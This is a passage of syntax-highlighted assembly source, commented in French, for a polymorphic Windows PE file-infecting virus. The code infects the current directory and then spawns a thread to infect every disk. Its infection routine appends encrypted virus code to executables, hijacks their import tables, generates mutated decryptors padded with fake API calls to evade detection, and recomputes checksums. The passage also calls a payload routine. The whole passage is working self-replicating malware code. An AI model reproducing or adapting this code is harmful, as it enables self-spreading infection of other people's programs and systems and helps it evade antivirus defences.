        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_apis</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">name_a32</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;apis de advapi32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">liste_apis_a32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apis_a32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_apis</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">calc_chksum</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;CheckSumMappedFile (optionnel)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">name_imagehlp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_image_help</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagehlp_api</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">calc_chksum</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">no_image_help</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_protected</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;SfcIsfileProtected (optionnel)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">name_sfc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_sfc</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_api</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_protected</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">no_sfc</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;================================ LANCEMENT DES THREADS =======================</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetTickCount</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_rand_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAND_SEED</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;infecte le rep courant</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_rep</span><span class="sc0">

</span><span class="sc1">;payload</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0">

</span><span class="sc1">;================================= RETOUR A L'HOTE ============================</span><span class="sc0">

</span><span class="sc5">retour_hote</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">retour_hote_prem_gen</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">restaure_hote</span><span class="sc0">
</span><span class="sc5">retour_hote_prem_gen</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;lance la thread qui ifnecte tous les disques</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infecte_disques</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_thread</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sauve_ancien_ep</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">k32_not_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k32_not_found</span><span class="sc0">




</span><span class="sc1">;======================================= FONCTIONS ============================</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">poly_defines.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">poly_assembleur.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">polymorphisation.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">fragmentation.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">fusion_imports.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">fake_apis.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">payload.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">relocation.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">infection.asm</span><span class="sc0">

</span><span class="sc1">;INFECTE_PE     in: eax--&gt; PE mappé en memoire</span><span class="sc0">
</span><span class="sc1">;               out : none</span><span class="sc0">
</span><span class="sc5">infecte_pe</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;edx--&gt;PE Header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;ebx=file mapping offset</span><span class="sc0">

        </span><span class="sc1">;reinit quelques trucs</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">adresses_interdites</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">locations</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;cherche la dernière section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0B0h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;marque d'infection</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SizeOfOptionalHeader</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;esi--&gt;sections</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">cherche_derniere_sec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ch2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">ch2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cherche_derniere_sec</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;ecx=VSize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">infecte_pe_fin</span><span class="sc0">                       </span><span class="sc1">;si vsize&gt;rawsize infecte pas</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encryption_relocs_init</span><span class="sc0">

        </span><span class="sc1">;les modifs d'usage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;entry point (rva)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;entry point(va)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ancien_ep</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                                                </span><span class="sc1">;edi--&gt;header derniere section (en ram)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;ajoute VSize (eax etait = a RVA section)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infection_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_start_va</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;RawAddress</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;VirtualSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;adresse du filemapping</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infection_raw</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">taille_virus_alignee</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">VIRTUAL_SIZE_VIRUS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;RawSize</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc5">SECTION_MASK</span><span class="sc0">

        </span><span class="sc1">;remplit la table des adresse interdites</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">evite_adresses</span><span class="sc0">

        </span><span class="sc1">;choisit un décrypteur parmis les deux dispos</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">poly_choisit_decrypteur</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_name_dll</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">detourne_pas_iat</span><span class="sc0">

        </span><span class="sc1">;modifie l'iat pour importer les apis du decrypteur + les fake apis</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;RVA de l'IAT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;esi=raw imports</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;ecx=size imports</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infection_raw</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;edi=raw addresse du virus (pas encore le code à ce niveau là, mais l'iat)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">imports_init</span><span class="sc0">       </span><span class="sc1">;détourne l'iat</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_name_dll</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">add_iid_decrypteur</span><span class="sc0"> </span><span class="sc1">;ajoute le iid</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iat_crypto_decrypteur</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">deal_imports</span><span class="sc0">       </span><span class="sc1">;importe les apis + les fake apis du dll</span><span class="sc0">
</span><span class="sc5">detourne_pas_iat</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">;cherche les fake apis (des autres dll) importées par l'hote</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">liste_fake_apis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_apis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_fake_apis</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">nb_fake_apis</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;pseudo-poly le decrypteur (ajoute des fake apis calls)</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_nb_parties_decrypteur</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mutated_pseudo_decrypteur</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_decrypteur</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">poly_pseudo_polymorphize</span><span class="sc0">
        </span><span class="sc1">;poly_nb_parties_decrypteur modifié</span><span class="sc0">

        </span><span class="sc1">;trouve X plages d'adresse de MAX_PARTIE_SIZE octets que l'on peut overwriter</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">PARTIE_MAX_SIZE</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_nb_parties_decrypteur</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trouve_adresses</span><span class="sc0">                </span><span class="sc1">;trouve poly_nb_parties_decrypteur endroits de PARTIE_MAX_SIZE octets chacuns</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infecte_pas</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sauvegarde_hote</span><span class="sc0">

        </span><span class="sc1">;assemble et ecrit le decrypteur aux endroit maintenant sauvegardes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mutated_pseudo_decrypteur</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">poly_polymorphise</span><span class="sc0">

        </span><span class="sc1">;encryption via les relocs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encryption_relocs</span><span class="sc0">


        </span><span class="sc1">;ecrit le code du virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infection_raw</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">TAILLE_IMPORTS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">     </span><span class="sc1">; edi = raw adresse du code du virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">debut_virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_len</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">;encrypte le code du virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fonction_encryption</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">infecte_pas</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">VIRTUAL_SIZE_VIRUS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">calc_chksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">infecte_pe_fin</span><span class="sc0">               </span><span class="sc1">;si CheckSumpMappedFile non present ...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                        </span><span class="sc1">;eax--&gt; PE_Header mappé en RAM</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;enregistre la nouvelle checksum</span><span class="sc0">
</span><span class="sc5">infecte_pe_fin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infecte_pe</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;RVA2RAW :      in :  eax=rva ,edx--&gt;pe_header</span><span class="sc0">
</span><span class="sc1">;               out : eax=raw adress</span><span class="sc0">
</span><span class="sc5">rva2raw</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;SizeOfOptionalHeader</span><span class="sc0">
